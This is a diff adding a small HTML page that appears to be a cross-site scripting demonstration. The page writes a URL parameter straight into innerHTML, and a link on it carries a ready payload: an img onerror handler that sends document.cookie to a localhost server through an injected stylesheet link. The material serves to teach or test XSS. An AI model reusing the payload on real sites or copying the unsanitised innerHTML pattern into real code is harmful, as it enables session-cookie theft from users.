@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Example</title>
+</head>
+<body>
+<div>
+<a href="/?msg=<img src=x onerror=&#34;document.head.innerHTML=`<link rel=stylesheet href='//localhost:8080/?`+document.cookie+`'>`&#34;>">Load an XSS payload on this page</a>
+</div>
+<p>
+Username: <input id="field" type="text" value="%NAME%" /><input id="login" type="submit" value="Log in">
+</p>
+<h1>Welcome, %NAME%</h1>
+<textarea id="text" style="width:300px;height:200px;">
+</textarea>
+<input id="preview" type="submit" value="Preview">
+<p>Message: <span id="msg"></span></p>
+<script>
+document.getElementById("login").addEventListener("click", function(ev) {
+  document.cookie = "username=" + document.getElementById("field").value
+  location.reload()
+})
+document.getElementById("preview").addEventListener("click", function(ev) {
+  location.href = "/?msg=" + document.getElementById("text").value
+})
+var msg = decodeURI(location.search.replace(/^\?msg=/, ""))
+document.getElementById("text").value = msg
+document.getElementById("msg").innerHTML = msg
+</script>
+</body>
+</html>
